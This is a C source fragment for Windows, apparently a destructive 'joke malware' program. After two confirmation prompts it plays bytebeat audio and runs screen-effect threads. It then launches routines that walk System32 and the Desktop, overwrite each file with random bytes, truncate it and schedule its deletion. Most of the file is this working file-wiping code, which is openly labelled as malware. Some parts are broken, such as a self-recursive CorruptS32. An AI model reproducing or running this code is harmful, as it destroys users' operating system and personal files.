    char buffer[9500 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = t * t >> (t & t >> 10) / 1;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI Audio7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 9500, 9500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[9500 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = t * t >> (t & t >> 8) / 1;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}



static BOOL FileExists(const wchar_t* wszPath) {
    WIN32_FILE_ATTRIBUTE_DATA fad;
    return GetFileAttributesExW(wszPath, GetFileExInfoStandard, &fad);
}

static BOOL CombinePath(wchar_t* wszOut, size_t nSize,
    const wchar_t* wszLeft,
    const wchar_t* wszRight) {
    if (!wszOut || !wszLeft || !wszRight) return FALSE;
    wcscpy_s(wszOut, nSize, wszLeft);
    size_t len = wcslen(wszOut);
    if (len > 0 && wszOut[len - 1] != L'\\') {
        wszOut[len] = L'\\';
        wszOut[len + 1] = L'\0';
    }
    wcscat_s(wszOut, nSize, wszRight);
    return TRUE;
}


static DWORD CALLBACK KillFile(wchar_t* wszPath) {
    if (!wszPath || !FileExists(wszPath)) return ERROR_FILE_NOT_FOUND;

    HANDLE hFile = CreateFileW(
        wszPath,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();

    HCRYPTPROV hProv = 0;
    BYTE rgb[4096];
    DWORD cbWritten = 0;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CloseHandle(hFile); return GetLastError();
    }

    if (!CryptGenRandom(hProv, sizeof(rgb), rgb)) {
        CryptReleaseContext(hProv, 0);
        CloseHandle(hFile);
        return GetLastError();
    }

    CryptReleaseContext(hProv, 0);

    WriteFile(hFile, rgb, sizeof(rgb), &cbWritten, NULL);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);

    MoveFileExW(wszPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    CloseHandle(hFile);
    return ERROR_SUCCESS;
}


DWORD WINAPI CorruptSystem32(LPVOID lpThread) {
    UNREFERENCED_PARAMETER(lpThread);

    wchar_t wszSystem32[MAX_PATH];
    GetSystemDirectoryW(wszSystem32, MAX_PATH);

    wchar_t wszTarget[MAX_PATH];
    CombinePath(wszTarget, MAX_PATH, wszSystem32, L"..\\System32");

    WIN32_FIND_DATAW ffd;
    wchar_t wszSearch[MAX_PATH];
    CombinePath(wszSearch, MAX_PATH, wszTarget, L"*");

    HANDLE hFind = FindFirstFileW(wszSearch, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return GetLastError();

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(ffd.cFileName, L".") && wcscmp(ffd.cFileName, L"..")) {
                wchar_t wszSub[MAX_PATH];
                CombinePath(wszSub, MAX_PATH, wszTarget, ffd.cFileName);

                wchar_t wszSubSearch[MAX_PATH];
                CombinePath(wszSubSearch, MAX_PATH, wszSub, L"*");

                HANDLE hSub = FindFirstFileW(wszSubSearch, &ffd);
                if (hSub != INVALID_HANDLE_VALUE) {
                    do {
                        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                            wchar_t wszFile[MAX_PATH];
                            CombinePath(wszFile, MAX_PATH, wszSub, ffd.cFileName);
                            KillFile(wszFile);
                        }
                    } while (FindNextFileW(hSub, &ffd));
                    FindClose(hSub);
                }
            }
        }
        else {
            wchar_t wszFile[MAX_PATH];
            CombinePath(wszFile, MAX_PATH, wszTarget, ffd.cFileName);
            KillFile(wszFile);
        }
    } while (FindNextFileW(hFind, &ffd));

    FindClose(hFind);
    return ERROR_SUCCESS;
}

DWORD WINAPI CorruptDesktop(LPVOID lpThread) {
    UNREFERENCED_PARAMETER(lpThread);

    wchar_t wszSystem32[MAX_PATH];
    GetSystemDirectoryW(wszSystem32, MAX_PATH);

    wchar_t wszTarget[MAX_PATH];
    CombinePath(wszTarget, MAX_PATH, wszSystem32, L"..\\Desktop");

    WIN32_FIND_DATAW ffd;
    wchar_t wszSearch[MAX_PATH];
    CombinePath(wszSearch, MAX_PATH, wszTarget, L"*");

    HANDLE hFind = FindFirstFileW(wszSearch, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return GetLastError();

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(ffd.cFileName, L".") && wcscmp(ffd.cFileName, L"..")) {
                wchar_t wszSub[MAX_PATH];
                CombinePath(wszSub, MAX_PATH, wszTarget, ffd.cFileName);

                wchar_t wszSubSearch[MAX_PATH];
                CombinePath(wszSubSearch, MAX_PATH, wszSub, L"*");

                HANDLE hSub = FindFirstFileW(wszSubSearch, &ffd);
                if (hSub != INVALID_HANDLE_VALUE) {
                    do {
                        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                            wchar_t wszFile[MAX_PATH];
                            CombinePath(wszFile, MAX_PATH, wszSub, ffd.cFileName);
                            KillFile(wszFile);
                        }
                    } while (FindNextFileW(hSub, &ffd));
                    FindClose(hSub);
                }
            }
        }
        else {
            wchar_t wszFile[MAX_PATH];
            CombinePath(wszFile, MAX_PATH, wszTarget, ffd.cFileName);
            KillFile(wszFile);
        }
    } while (FindNextFileW(hFind, &ffd));

    FindClose(hFind);
    return ERROR_SUCCESS;
}
__declspec(dllexport)
DWORD WINAPI CorruptS32(LPVOID lpParameter) {
    return CorruptS32(lpParameter);
}

bool t1;
unsigned int t2;

int main()
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    if (MessageBoxW(0, L"Run malware?", L"fuck..." + rand() % 512, MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    if (MessageBoxW(0, L"Are you sure?\nit will corrupt the System.\nbut it countains flashing lights.", L"fuck..." + rand() % 512, MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    Sleep(1000);
    Audio();
    CreateThread(0, 0, payloadspam1, 0, 0, 0);
    HANDLE thread3 = CreateThread(0, 0, tHSL, 0, 0, 0);
    Sleep(10000);
    HANDLE thread3or2 = CreateThread(0, 0, warp, 0, 0, 0);
    Sleep(20000);
    InvalidateRect(0, 0, 0);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    TerminateThread(thread3or2, 0);
    CloseHandle(thread3or2);
    Audio2();
    Sleep(500);
    HANDLE thread4 = CreateThread(0, 0, payloadRO, 0, 0, 0);
    Sleep(30000);
    InvalidateRect(0, 0, 0);
    Audio3();
    Sleep(500);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    HANDLE thread6 = CreateThread(0, 0, GDIX0R, 0, 0, 0);
    Sleep(30000);
    TerminateThread(thread6, 0);
    CloseHandle(thread6);
    HANDLE thread7 = CreateThread(0, 0, payload4, 0, 0, 0);
    CreateThread(0, 0, icon, 0, 0, 0);
    CreateThread(0, 0, icon2, 0, 0, 0);
    Audio4();
    Sleep(30000);
    TerminateThread(thread7, 0);
    CloseHandle(thread7);
    HANDLE thread8 = CreateThread(0, 0, payload5, 0, 0, 0);
    HANDLE threadtext = CreateThread(0, 0, textout, 0, 0, 0);
    Audio5();
    Sleep(30000);
    TerminateThread(thread8, 0);
    CloseHandle(thread8);
    TerminateThread(threadtext, 0);
    CloseHandle(threadtext);
    HANDLE thread9 = CreateThread(0, 0, payload6, 0, 0, 0);
    Audio6();
    Sleep(30000);
    TerminateThread(thread9, 0);
    CloseHandle(thread9);
    HANDLE thread10 = CreateThread(0, 0, payload7, 0, 0, 0);
    Audio7();
    Sleep(30000);
    CreateThread(0, 0, CorruptS32, 0, 0, 0);
    CreateThread(0, 0, CorruptSystem32, 0, 0, 0);
    CreateThread(0, 0, CorruptDesktop, 0, 0, 0);
    TerminateThread(thread10, 0);
    CloseHandle(thread10);
    Audio4or1();
    Sleep(5000);
    Sleep(-1);
}